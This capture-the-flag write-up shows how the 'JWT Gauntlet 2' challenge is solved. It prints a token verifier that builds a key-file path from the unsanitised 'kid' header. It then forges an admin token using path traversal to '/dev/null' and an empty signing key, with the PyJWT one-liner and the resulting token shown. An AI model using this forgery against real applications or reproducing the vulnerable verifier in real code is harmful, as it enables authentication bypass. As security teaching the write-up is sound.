# JWT Gauntlet 2 Writeup

### Disclaimer
This challenge is a sequal to `JWT Gauntlet 1`, so this writeup will assume you have read that one.

### Writeup

The website fot this appears to be the exact same, except the description mentions rewriting the JWT token validation function and adding some way to `get keys`. this `get keys` likely implies the useage of the `kids` header which is a header that can be used to specify which key the JWT should be verified with, this is of course ripe for vulnerabilities if done incorrectly.

Getting the new session token shows that this hypothesis is correct:

```txt
session: eyJhbGciOiJIUzI1NiIsImtpZCI6InNlY3JldC5rZXkiLCJ0eXAiOiJKV1QifQ.eyJhZG1pbiI6ZmFsc2V9.NAA3FBOY0ZMhv12G0md-g1NDu0ig0WHkHqB8YW4zjBU
```

Decrypting it (again just base64, but I prefer `jwt.io`):
```json
{
  "alg": "HS256",
  "kid": "secret.key",
  "typ": "JWT"
}
{
  "admin": false
}
```

Next the `robots.txt` still has the .pyi file so we can see what the new verfier is:
```txt
Disallow: /app.pyi
```

I will spare you the rest of the code which has not changed besides adding the JWT header when creating the token, and removing the `/pub` endpoint, and instead only show you the new JWT verifying code:

```python
def is_admin(request) -> bool:
    token = request.cookies.get("session")
    if token is None:
        return False

    try:
        header = jwt.get_unverified_header(token)
        kid = header["kid"]

        try:
            with open("keys/" + kid, "r") as f:
                key = f.read().strip()
        except:
            return False

        data = jwt.decode(token, key, algorithms=["HS256"])
        return data.get("admin", False)
    except:
        return False
```

As we can see, this just grabs the `kid` header and appends it to the end `keys/`, and as there is no sanitisation we can use `../` to do path traversal and use any file we want as the secret key for out JWT. In this case the typicall, and best option is to choose a file that exists on all Linux Machines and cannot change ot any other value, namely the `/dev/null` file, which always has nothing in it, and if anything it written to it, the data is just deleted.

So we can set the `kid` value to `../../../../../../../dev/null`, and then sign the forged JWT with an empty string, and that should work.

Saddly, `jwt.io` does not allow users to create a JWT signed with a null key, as such we must download an implementation of the JWT protocol and make it with that, as teh server is likely still using `PyJwt`, which is the most common python JWT package, so we can donwload that and then write a small script to craft out JWT. I prefer to do this in a few commands in the cmd, as opposed to makign a script:

```cmd
$python3 -m venv jwt
$source jwt/bin/activate
$python3 -c "import jwt; token = jwt.encode({'admin': True}, '', algorithm='HS256', headers={'kid':'../../../../../../../dev/null'}); print(token);"
eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.ovS4FjtOxoczEoy02HjTyMJz5cGwOfYn_tAgc3hS_AE
```

That generates a proper JWT, which if we set to be the cookie and reload the index page, just like last time shows a new button in the navbar called `Admin`, which when pressed redirects us to a page which just as the flag on it

```txt
redroomctf{K1D5_4r3_4750_1n53cur3?}
```
